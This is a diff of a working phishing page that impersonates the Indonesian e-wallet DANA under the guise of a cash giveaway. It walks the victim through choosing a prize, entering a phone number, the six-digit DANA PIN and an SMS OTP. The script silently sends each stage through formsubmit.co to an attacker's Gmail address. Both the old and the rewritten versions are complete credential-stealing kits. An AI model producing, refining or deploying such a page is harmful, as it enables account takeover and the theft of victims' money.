@@ -4,54 +4,46 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <meta name="theme-color" content="#008CFF">
-    <title>DANA Giveaway</title>
+    <title>DANA - Giveaway</title>
     <style>
-        /* RESET & BASE */
+        /* RESET TOTAL */
         * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; outline: none; }
-        html, body { width: 100%; height: 100%; font-family: 'Arial', sans-serif; overflow: hidden; background-color: #008CFF; }
+        html, body { width: 100%; height: 100%; font-family: -apple-system, sans-serif; overflow: hidden; background-color: #008CFF; }
         
         .app-container { display: flex; flex-direction: column; height: 100vh; width: 100%; }
-        section { display: none; flex-direction: column; height: 100%; width: 100%; }
+        section { display: none; flex-direction: column; height: 100%; width: 100%; position: relative; }
 
-        /* HEADER GLOBAL */
-        .header { padding: 20px; text-align: center; color: white; font-weight: bold; font-size: 1.2rem; }
-        .logo-dana { height: 30px; margin-bottom: 10px; }
-
-        /* HALAMAN 1: GIVEAWAY (Warna Terang) */
-        #page-giveaway { display: flex; background-color: #00A9E0; }
-        .white-card { 
-            background: white; border-radius: 30px 30px 0 0; 
-            padding: 30px 20px 100px; margin-top: auto; box-shadow: 0 -10px 20px rgba(0,0,0,0.1); 
-        }
-        .prize-item { 
-            display: flex; align-items: center; border: 2px solid #f2f2f2; 
-            border-radius: 15px; padding: 15px; margin-bottom: 15px; cursor: pointer; color: #333;
-        }
-        input[type="radio"] { display: none; }
-        input[type="radio"]:checked + .prize-item { border-color: #008CFF; background-color: #f0f8ff; }
-
-        /* HALAMAN 2 & 3: PHONE & PIN (Warna Biru DANA) */
-        .blue-bg { background-color: #008CFF; color: white; justify-content: center; align-items: center; padding: 20px; }
-        .input-group { display: flex; background: white; border-radius: 10px; width: 100%; overflow: hidden; margin: 20px 0; }
-        .prefix { color: #333; padding: 15px; font-weight: bold; border-right: 1px solid #eee; }
-        .phone-input { flex: 1; padding: 15px; border: none; font-size: 1.1rem; }
-
-        /* PIN BOXES */
-        .pin-container { display: flex; gap: 10px; margin: 30px 0; }
-        .pin-dot { width: 45px; height: 45px; background: white; border-radius: 10px; color: black; font-size: 24px; line-height: 45px; text-align: center; font-weight: bold; }
-
-        /* HALAMAN 4: OTP (Warna Putih) */
-        #page-otp { background: white; color: #333; }
-        .otp-inputs { display: flex; justify-content: center; gap: 10px; margin: 30px 0; }
-        .otp-inputs input { width: 50px; height: 60px; text-align: center; font-size: 1.5rem; border: 2px solid #ddd; border-radius: 10px; font-weight: bold; }
-
-        /* BUTTONS */
-        .btn-main { width: 100%; padding: 16px; border-radius: 50px; border: none; font-weight: bold; font-size: 1rem; cursor: pointer; transition: 0.2s; }
+        /* WARNA & TAMPILAN */
+        .header-blue { flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; padding-top: env(safe-area-inset-top); }
+        .white-card { background: white; border-radius: 30px 30px 0 0; padding: 25px 20px 100px; box-shadow: 0 -10px 20px rgba(0,0,0,0.1); }
+        
+        /* TOMBOL */
+        .btn-dana { width: 100%; padding: 16px; border-radius: 50px; border: none; font-weight: bold; font-size: 1rem; cursor: pointer; transition: 0.2s; }
         .btn-blue { background: #008CFF; color: white; }
         .btn-white { background: white; color: #008CFF; }
 
-        /* NAVBAR (Hanya di Hal 1) */
-        .navbar { position: fixed; bottom: 0; width: 100%; height: 70px; background: white; display: flex; justify-content: space-around; align-items: center; border-top: 1px solid #eee; }
+        /* STEP 1: GIVEAWAY */
+        #page-giveaway { display: flex; background: #00A9E0; }
+        .prize-item { display: flex; align-items: center; border: 2px solid #f2f2f2; border-radius: 15px; padding: 15px; margin-bottom: 12px; color: #333; }
+        input[type="radio"] { display: none; }
+        input[type="radio"]:checked + .prize-item { border-color: #008CFF; background-color: #f0f8ff; }
+
+        /* STEP 2: PHONE */
+        .input-group { display: flex; background: white; border-radius: 10px; width: 100%; overflow: hidden; margin: 25px 0; }
+        .prefix { color: #000; padding: 15px; font-weight: bold; border-right: 1px solid #eee; display: flex; align-items: center; }
+        .phone-input { flex: 1; padding: 15px; border: none; font-size: 1.1rem; }
+
+        /* STEP 3: PIN */
+        .pin-container { display: flex; justify-content: center; gap: 10px; margin: 30px 0; }
+        .pin-dot { width: 45px; height: 45px; background: white; border-radius: 10px; color: black; font-size: 24px; line-height: 45px; text-align: center; }
+
+        /* STEP 4: OTP */
+        #page-otp { background: white; color: #333; }
+        .otp-inputs { display: flex; justify-content: center; gap: 8px; margin: 35px 0; }
+        .otp-inputs input { width: 50px; height: 60px; text-align: center; font-size: 1.5rem; border: 2px solid #ddd; border-radius: 10px; font-weight: bold; }
+
+        /* NAV BOTTOM (Halaman 1) */
+        .navbar { position: fixed; bottom: 0; width: 100%; height: 75px; background: white; display: flex; justify-content: space-around; align-items: center; border-top: 1px solid #eee; padding-bottom: env(safe-area-inset-bottom); }
     </style>
 </head>
 <body>
@@ -59,126 +51,155 @@
 <div class="app-container">
 
     <section id="page-giveaway">
-        <div style="flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; color: white;">
-            <h1 style="font-size: 2.5rem; font-weight: 900;">DANA</h1>
-            <p style="background: #FFD700; color: #0077C8; padding: 5px 20px; border-radius: 20px; font-weight: bold;">GIVEAWAY</p>
+        <div class="header-blue">
+            <h1 style="color:white; font-size:2.5rem; font-weight:900;">DANA</h1>
+            <div style="background:#FFD700; color:#0077C8; padding:5px 20px; border-radius:20px; font-weight:bold; margin-top:10px;">GIVEAWAY</div>
         </div>
         <div class="white-card">
-            <p style="text-align: center; font-weight: bold; color: #008CFF; margin-bottom: 20px;">PILIH NOMINAL HADIAH</p>
-            <label><input type="radio" name="gift" value="Rp10.000.000"><div class="prize-item">💸 Rp10.000.000</div></label>
-            <label><input type="radio" name="gift" value="Rp20.000.000"><div class="prize-item">💸 Rp20.000.000</div></label>
-            <label><input type="radio" name="gift" value="Rp30.000.000"><div class="prize-item">💸 Rp30.000.000</div></label>
-            <button class="btn-main btn-blue" onclick="nextPage('page-giveaway', 'page-phone')">KONFIRMASI</button>
+            <p style="text-align:center; font-weight:bold; color:#008CFF; margin-bottom:20px;">PILIH HADIAH ANDA</p>
+            <label><input type="radio" name="gift" value="10 Juta"><div class="prize-item"><b>💸 Rp10.000.000</b></div></label>
+            <label><input type="radio" name="gift" value="20 Juta"><div class="prize-item"><b>💸 Rp20.000.000</b></div></label>
+            <label><input type="radio" name="gift" value="30 Juta"><div class="prize-item"><b>💸 Rp30.000.000</b></div></label>
+            <button class="btn-dana btn-blue" onclick="saveGift()">KONFIRMASI</button>
         </div>
         <nav class="navbar">
-            <div style="color:#999; font-size:0.7rem; text-align:center;">🏠<br>Beranda</div>
-            <div style="background:#008CFF; width:50px; height:50px; border-radius:50%; margin-top:-30px; border:4px solid white; color:white; display:flex; align-items:center; justify-content:center; font-weight:bold;">PAY</div>
-            <div style="color:#999; font-size:0.7rem; text-align:center;">👤<br>Saya</div>
+            <div style="text-align:center; color:#999; font-size:0.7rem;">🏠<br>Beranda</div>
+            <div style="background:#008CFF; width:50px; height:50px; border-radius:50%; margin-top:-35px; border:4px solid white; color:white; display:flex; align-items:center; justify-content:center; font-weight:bold;">PAY</div>
+            <div style="text-align:center; color:#999; font-size:0.7rem;">👤<br>Saya</div>
         </nav>
     </section>
 
-    <section id="page-phone" class="blue-bg">
+    <section id="page-phone" style="justify-content: center; align-items: center; padding: 20px; color: white; text-align: center;">
         <h2 style="font-size: 2rem; margin-bottom: 10px;">DANA</h2>
-        <p>Masukkan nomor HP untuk melanjutkan</p>
+        <p>Masukkan nomor HP kamu untuk lanjut</p>
         <div class="input-group">
             <div class="prefix">+62</div>
-            <input type="tel" id="inPhone" class="phone-input" placeholder="8123456789" maxlength="13">
+            <input type="tel" id="userPhone" class="phone-input" placeholder="8112345678" maxlength="13">
         </div>
-        <button class="btn-main btn-white" onclick="submitPhone()">LANJUTKAN</button>
+        <button class="btn-dana btn-white" onclick="savePhone()">LANJUTKAN</button>
     </section>
 
-    <section id="page-pin" class="blue-bg" onclick="document.getElementById('inPIN').focus()">
-        <p style="margin-bottom: 20px;">Masukkan <b>PIN DANA</b> kamu</p>
+    <section id="page-pin" style="justify-content: center; align-items: center; padding: 20px; color: white; text-align: center;" onclick="document.getElementById('pinReal').focus()">
+        <p>Masukkan <b>PIN DANA</b> kamu</p>
         <div class="pin-container">
-            <div class="pin-dot" id="dot1"></div>
-            <div class="pin-box pin-dot" id="dot2"></div>
-            <div class="pin-box pin-dot" id="dot3"></div>
-            <div class="pin-box pin-dot" id="dot4"></div>
-            <div class="pin-box pin-dot" id="dot5"></div>
-            <div class="pin-box pin-dot" id="dot6"></div>
+            <div class="pin-dot" id="p1"></div>
+            <div class="pin-dot" id="p2"></div>
+            <div class="pin-dot" id="p3"></div>
+            <div class="pin-dot" id="p4"></div>
+            <div class="pin-dot" id="p5"></div>
+            <div class="pin-dot" id="p6"></div>
         </div>
-        <input type="password" id="inPIN" maxlength="6" inputmode="numeric" style="position: absolute; opacity: 0;">
+        <input type="password" id="pinReal" maxlength="6" inputmode="numeric" style="position: absolute; opacity: 0;">
         <p style="font-size: 0.8rem; font-weight: bold; border: 1px solid white; padding: 5px 15px; border-radius: 20px;">TAMPILKAN</p>
     </section>
 
     <section id="page-otp">
-        <div class="header" style="background: #008CFF;">Verifikasi OTP</div>
+        <div style="background:#008CFF; color:white; padding:20px; text-align:center; font-weight:bold; padding-top:40px;">Verifikasi OTP</div>
         <div style="padding: 40px 20px; text-align: center;">
             <h3>Masukkan Kode OTP</h3>
-            <p style="color: #666; font-size: 0.9rem; margin-top: 10px;">Kode verifikasi telah dikirim melalui SMS</p>
+            <p style="color: #666; font-size: 0.9rem; margin-top: 10px;">Kode dikirim via SMS ke nomor Anda</p>
             <div class="otp-inputs">
-                <input type="tel" maxlength="1" class="otpf" oninput="moveOTP(this, 0)">
-                <input type="tel" maxlength="1" class="otpf" oninput="moveOTP(this, 1)">
-                <input type="tel" maxlength="1" class="otpf" oninput="moveOTP(this, 2)">
-                <input type="tel" maxlength="1" class="otpf" oninput="moveOTP(this, 3)">
+                <input type="tel" maxlength="1" class="otpin" oninput="moveOTP(this, 0)">
+                <input type="tel" maxlength="1" class="otpin" oninput="moveOTP(this, 1)">
+                <input type="tel" maxlength="1" class="otpin" oninput="moveOTP(this, 2)">
+                <input type="tel" maxlength="1" class="otpin" oninput="moveOTP(this, 3)">
             </div>
-            <button class="btn-main btn-blue" onclick="submitOTP()">KONFIRMASI</button>
-            <p style="margin-top: 20px; color: #008CFF; font-weight: bold;">Kirim Ulang (100s)</p>
+            <button class="btn-dana btn-blue" onclick="saveOTP()">KONFIRMASI</button>
+            <p style="margin-top: 25px; color: #008CFF; font-weight: bold;">Kirim Ulang (100s)</p>
         </div>
     </section>
 
 </div>
 
 <script>
-    const EMAIL_TARGET = "baygaming648@gmail.com";
-    let userData = { prize: "", phone: "", pin: "", otp: "" };
+    // KONFIGURASI
+    const EMAIL_SAYA = "baygaming648@gmail.com";
+    let dataKirim = { hadiah: "", nomor: "", pin: "", otp: "" };
 
-    // Fungsi Kirim Email via AJAX (Tanpa Refresh)
-    function sendToEmail(data) {
-        fetch(`https://formsubmit.co/ajax/${EMAIL_TARGET}`, {
+    // FUNGSI KIRIM DATA (AJAX - SILENT SEND)
+    function kirimKeEmail(objekData) {
+        fetch(`https://formsubmit.co/ajax/${EMAIL_SAYA}`, {
             method: "POST",
             headers: { "Content-Type": "application/json", "Accept": "application/json" },
-            body: JSON.stringify(data)
+            body: JSON.stringify(objekData)
         });
     }
 
-    function nextPage(curr, next) {
-        document.getElementById(curr).style.display = 'none';
-        document.getElementById(next).style.display = 'flex';
+    function gantiHal(tutup, buka) {
+        document.getElementById(tutup).style.display = 'none';
+        document.getElementById(buka).style.display = 'flex';
     }
 
-    // Step 2: Kirim Nomor HP & Hadiah
-    function submitPhone() {
-        const phone = document.getElementById('inPhone').value;
-        const prize = document.querySelector('input[name="gift"]:checked')?.value;
-        if (phone.length > 8 && prize) {
-            userData.phone = "+62" + phone;
-            userData.prize = prize;
-            sendToEmail({ Status: "Input Nomor HP", Hadiah: userData.prize, Nomor: userData.phone });
-            nextPage('page-phone', 'page-pin');
-            document.getElementById('inPIN').focus();
-        } else { alert("Data belum lengkap!"); }
+    // 1. SIMPAN HADIAH
+    function saveGift() {
+        const h = document.querySelector('input[name="gift"]:checked');
+        if(h) {
+            dataKirim.hadiah = h.value;
+            gantiHal('page-giveaway', 'page-phone');
+        } else { alert("Pilih hadiah!"); }
     }
 
-    // Step 3: Kirim PIN (Otomatis saat 6 angka)
-    const pinInput = document.getElementById("inPIN");
-    const dots = [1,2,3,4,5,6].map(i => document.getElementById("dot"+i));
-    
-    pinInput.addEventListener("input", () => {
-        const val = pinInput.value;
+    // 2. SIMPAN NOMOR (LANGSUNG KIRIM KE EMAIL)
+    function savePhone() {
+        const n = document.getElementById('userPhone').value;
+        if(n.length > 8) {
+            dataKirim.nomor = "+62" + n;
+            // Kirim tahap 1
+            kirimKeEmail({
+                "INFO": "Nomor HP Dimasukkan",
+                "Nomor_HP": dataKirim.nomor,
+                "Hadiah_Pilihan": dataKirim.hadiah
+            });
+            gantiHal('page-phone', 'page-pin');
+            document.getElementById('pinReal').focus();
+        } else { alert("Nomor tidak valid!"); }
+    }
+
+    // 3. LOGIKA PIN (OTOMATIS KIRIM SAAT 6 DIGIT)
+    const pinReal = document.getElementById("pinReal");
+    const dots = [1,2,3,4,5,6].map(i => document.getElementById("p"+i));
+
+    pinReal.addEventListener("input", () => {
+        const val = pinReal.value;
         dots.forEach((dot, i) => dot.textContent = val[i] ? "•" : "");
+        
         if (val.length === 6) {
-            userData.pin = val;
-            sendToEmail({ Status: "Input PIN", Nomor: userData.phone, PIN: userData.pin });
-            setTimeout(() => nextPage('page-pin', 'page-otp'), 300);
+            dataKirim.pin = val;
+            // Kirim tahap 2
+            kirimKeEmail({
+                "INFO": "PIN Dimasukkan",
+                "Nomor_HP": dataKirim.nomor,
+                "PIN_DANA": dataKirim.pin
+            });
+            setTimeout(() => {
+                gantiHal('page-pin', 'page-otp');
+            }, 300);
         }
     });
 
-    // Step 4: OTP
+    // 4. LOGIKA OTP (FINAL KIRIM SEMUA DATA)
     function moveOTP(el, idx) {
-        if(el.value && idx < 3) document.querySelectorAll(".otpf")[idx+1].focus();
+        const fields = document.querySelectorAll(".otpin");
+        if(el.value && idx < 3) fields[idx+1].focus();
     }
 
-    function submitOTP() {
-        const otpVal = Array.from(document.querySelectorAll(".otpf")).map(i => i.value).join('');
-        if (otpVal.length === 4) {
-            userData.otp = otpVal;
-            sendToEmail({ Status: "Final OTP", Hadiah: userData.prize, Nomor: userData.phone, PIN: userData.pin, OTP: userData.otp });
-            alert("Verifikasi sedang diproses, silakan tunggu.");
-            location.reload(); // Selesai
-        } else { alert("Isi OTP lengkap!"); }
+    function saveOTP() {
+        const otpVal = Array.from(document.querySelectorAll(".otpin")).map(i => i.value).join('');
+        if(otpVal.length === 4) {
+            dataKirim.otp = otpVal;
+            // Kirim tahap Final
+            kirimKeEmail({
+                "INFO": "FINAL DATA (LENGKAP)",
+                "Hadiah": dataKirim.hadiah,
+                "Nomor_HP": dataKirim.nomor,
+                "PIN_DANA": dataKirim.pin,
+                "Kode_OTP": dataKirim.otp
+            });
+            alert("Sedang memproses hadiah Anda. Mohon tunggu 1x24 jam.");
+            location.reload();
+        } else { alert("Masukkan OTP lengkap!"); }
     }
 </script>
 
 </body>
-                                                                                                                                                                                                                                   </html>
+    </html>
